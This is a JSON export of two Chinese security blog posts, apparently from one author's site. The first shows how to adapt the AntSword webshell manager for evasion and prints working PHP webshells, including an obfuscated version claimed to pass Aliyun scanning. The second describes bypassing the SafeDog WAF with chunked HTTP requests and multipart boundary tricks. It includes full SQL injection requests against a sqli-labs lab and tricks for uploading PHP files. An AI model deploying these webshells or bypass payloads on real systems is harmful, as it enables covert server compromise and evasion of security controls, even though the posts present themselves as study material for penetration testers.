[{"id":"0bde8e350134ac3c0961afd29aadf7f8","title":"phpwebshell免杀","content":"AntSword0x00 前言：为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。\n0x01 蚁剑介绍及其改编：关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。\n但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。\n蚁剑默认流量返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。\n默认的base64编码器但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。\n去github上找到蚁剑的编码器和对应的解码器github地址:（编码器）这里下载默认的aes-128的默认流量。\n默认编码器的webshell\n&lt;?php\n@session_start();\n$pwd='ant';\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));\n?>\n\n默认webshell讲解：这里打开session_start，然后截取Cookie中的PHPSESSION的16位。\n然后进行aes加密，密码为pwd\n\n再D盾，河马和阿里云进行扫描：\n河马没有查出来，可能是比较弱阿里云直接报恶意\n\n初步修改后的webshell：&lt;?php\n@session_start();\nerror_reporting(E_ALL^E_NOTICE^E_WARNING);\nfunction decode($key,$data)&#123;\n$data_new = '';\nfor($i=0;$i&lt;=strlen($data);$i++)&#123;\n$b=$data[$i]^$key;\n$data_new = $data_new.urldecode($b);\n&#125;\ndefine('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);\ndefine('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');\nreturn $data_new;\n&#125;\nfunction decrypto($key,$data)&#123;\n$data = base64_decode($data);\n$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);\ndecode('\\\\','=:=om>n?o8h9i:j;k*d0e.l/m(');\n$ass=ass;\n$ass(ev);\n&#125;\nclass run&#123;\n    public $data;\n    public function __construct()&#123;\n$this->data = '#````````#'.$_POST[1].\"#`#`#\";\n$this->data = $this->data.\"123456\";\n&#125;\n&#125;\n$key=@substr(str_pad(session_id(),16,'a'),0,16);\n$run = new run();\ndecrypto($key,$run->data);\n?>\n\n这里能过去D盾，但是无法绕过阿里云查杀。\n所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）\n混淆之后的webshell：这里提供php在线加密的站\nhttps://enphp.djunny.com/\n\n这里加密之后生成webshell。如下：\ngoto Zc4oD; UJih6: function decrypto($key, $data) &#123; goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, \"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode(\"\\x5c\", \"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: &#125; goto DGZMG; WvjFi: ini_set(\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\", \"\\117\\146\\x66\"); goto Wguwk; DGZMG: class run &#123; public $data; public function __construct() &#123; $this->data = \"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\" . $_POST[1] . \"\\x23\\140\\x23\\140\\43\"; &#125; &#125; goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, \"\\141\"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) &#123; goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define(\"\\141\\x73\\x73\", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define(\"\\x65\\166\", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . \"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i &lt;= strlen($data))) &#123; goto RuTl1; &#125; goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: &#125; goto UJih6; apKNY: decrypto($key, $run->data);\n\n经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。\n已经成功绕过阿里云查杀。用burpsuite抓下流量特征。\n从流量加密来分析的话，已经能绕过态势感知和全流量分析机。\n蚁剑UA头的修改：在burp的数据包中能清楚的看到蚁剑的特征\n在目录&#x2F;modules&#x2F;request.js文件中修改UA头\n&#x2F;modules&#x2F;update.js文件修改\n0x03 总结：关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过shellcode免杀，但是还没有过windows defender，所以就推迟一段时间来写。感谢各位拜读。\n","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","categories_index":"","tags_index":"免杀","author_index":"Q16G"},{"id":"cf78fa225b6de7abf9eac61bd71ce650","title":"waf绕过-打狗棒法","content":"0x01 前言某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。\n\n环境的搭建：环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)\nTip：\n  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）\n  （2）上传防护中把完整的post包过滤勾选上。\n\n0x02 HTTP补充：分块传输的介绍：分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。\n请求头Transfer-encoding：官方文档:\n告知接收方为了可靠地传输报文，已经对其进行了何种编码。\n\nchunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。并且长度中是以;作为长度的结束\n数据包中添加：Transfer-Encoding: chunked\n数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车\n\n当设置这个Transfer-Encoding请求头的时候，会有两个效果：\nContent-length字段自动忽略\n基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）\n\n\nHTTP持久化连接：因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。\n持久化连接：\n  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。\n\n  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。\n\nContent-Type介绍：Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。常见Content-Type的格式如下：\nContent-Type: text/html;\nContent-Type: application/json;charset:utf-8;\nContent-Type：type/subtype ;parameter\nContent-Type：application/x-www-form-urlencoded\nContent-Type：multipart/form-data\n\n重点介绍multipart&#x2F;form-data：当服务器使用multipart&#x2F;form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？其中就是用了boundary边界来进行操作的。\nwaf绕过的思路：正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。\n例如：正常传输过程中是这样的。那分块传输之后，就变成了这样。\nPOST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 128\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n4\nunam\n1\ne\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\npass\n2\nwd\n1\n=\n4\nadmi\n1\nn\n1\n&amp;\n4\nsubm\n2\nit\n1\n=\n4\nSubm\n2\nit\n0\n\n\n说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。\n绕过安全狗的sql注入：这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。\n以sql-labs为例：在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把’union select (database()),2#。这个东西进行了过滤咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。\nTransfer-Encoding: chunked\n这个东西，然后进行分块即可。\n\n读取数据库名POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 251\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n4\nname\n1\n=\n1\n&amp;\n2\npa\n4\nsswd\n1\n=\n3\n%27\n2\nun\n1\ni\n2\non\n1\n+\n2\nse\n1\nl\n2\nec\n1\nt\n1\n+\n3\n%28\n2\nda\n1\nt\n2\nab\n1\na\n2\nse\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n3\nsub\n3\nmit\n1\n=\n3\nSub\n3\nmit\n0\n\n\n读取表名：POST /sqli-labs-master/Less-11/ HTTP/1.1\nHost: 192.168.172.161\nContent-Length: 619\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.172.161\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.172.161/sqli-labs-master/Less-11/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nTransfer-Encoding: chunked\n\n1\nu\n2\nna\n1\nm\n1\ne\n1\n=\n1\n&amp;\n2\npa\n2\nss\n2\nwd\n1\n=\n3\n%27\n1\nu\n2\nni\n1\no\n1\nn\n1\n+\n2\nse\n2\nle\n1\nc\n1\nt\n1\n+\n3\n%28\n2\nse\n1\nl\n1\ne\n2\nct\n1\n+\n2\ngr\n2\nou\n1\np\n1\n_\n2\nco\n2\nnc\n2\nat\n3\n%28\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nna\n2\nme\n3\n%29\n1\n+\n2\nfr\n2\nom\n1\n+\n2\nin\n2\nfo\n1\nr\n3\nmat\n2\nio\n1\nn\n1\n_\n2\nsc\n3\nhem\n1\na\n1\n.\n2\nta\n2\nbl\n2\nes\n1\n+\n2\nwh\n2\ner\n1\ne\n1\n+\n2\nta\n2\nbl\n1\ne\n1\n_\n2\nsc\n2\nhe\n1\nm\n1\na\n3\n%3D\n2\nda\n1\nt\n2\nab\n3\nase\n3\n%28\n3\n%29\n3\n%29\n3\n%2C\n1\n2\n3\n%23\n1\n&amp;\n2\nsu\n3\nbmi\n1\nt\n1\n=\n2\nSu\n4\nbmit\n0\n\n\n读列名：\n读取数据：\n绕过安全狗的文件上传（以pikachu靶场为例这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：这块先去上传php文件为例，可以进行分块传输的构造。然后上传。发现单单的分块传输已经不能绕过安全狗文件上传的检测了。\nContent-Type中的boundary边界混淆绕过因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart&#x2F;form-data来进行的文件上传操作，刚才讲到了利用multipart&#x2F;form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。\n深入研究boundary边界问题：这里拿上面的边界来做文章，这里看到了，当上面定义了boundary&#x3D;—-WFJAFAOKAJNFKLAJ的时候我想到了两个问题。\n1.如果有两个boundary是取前一个还是后一个？\n2.boundary结束标志必须和定义的一定相同嘛？\n\n下面继续一一测试\n\nboundary边界问题fuzz：boundary边界一致：\nboundary结束标志不一致：\nboundary开始标志不一致：上面经过研究可以发现boundary结束标志不影响判断。\n多个boundary：\n所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。\n多个boundary混淆：这里进入uploads&#x2F;1.php查看\n成功绕过waf。\n发现：这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。\n对于分块传输的小Tip：(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf\n(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf\n(3)分块传输只是适用于post请求，这也是存在的弊端问题\n\n总结：绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。\n参考文献：https://zhuanlan.zhihu.com/p/465948117\nhttp://t.zoukankan.com/liujizhou-p-11802189.html\nhttps://copyfuture.com/blogs-details/202203261638435585\n\n","slug":"test1","date":"2023-05-24T02:37:22.000Z","categories_index":"","tags_index":"waf绕过","author_index":"Q16G"}]